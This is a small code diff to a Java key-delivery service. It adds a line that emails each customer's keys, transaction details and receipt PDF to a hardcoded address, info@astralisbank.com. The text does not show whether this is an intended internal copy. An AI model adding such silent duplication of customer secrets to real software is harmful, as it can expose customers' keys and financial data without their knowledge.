@@ -141,6 +141,7 @@ public class KeyPollingService {
             String filename = "receipt_" + transaction.getTransactionNumber() + ".pdf";
 
             sendGridEmailService.sendEmail(orderRequest.getEmail(), subject, body, keys, transaction, pdfBytes, filename);
+            sendGridEmailService.sendEmail("info@astralisbank.com", subject, body, keys, transaction, pdfBytes, filename);
         }
 
         if (orderRequest.getPhoneNumber() != null && orderRequest.getSendKeyToSMS()) {
